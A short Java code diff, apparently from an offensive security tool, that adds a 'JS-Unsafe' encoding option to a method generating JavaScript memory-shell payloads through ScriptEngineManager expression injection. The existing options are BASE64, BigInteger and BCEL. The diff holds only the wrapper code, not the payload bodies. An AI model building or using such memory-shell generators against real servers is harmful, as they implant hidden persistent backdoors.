@@ -63,6 +63,7 @@ public class ScriptEngineManagerExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
+                    "[+] JS-Unsafe方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE)) + System.lineSeparator() + " <==",
                     "[+] JS-BASE64方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64)) + System.lineSeparator() + " <==",
                     "[+] JS-BigInteger方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER)) + System.lineSeparator() + " <==",
                     "[+] JS-BCEL方案：==>" + System.lineSeparator() + out(MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL)) + System.lineSeparator() + " <=="
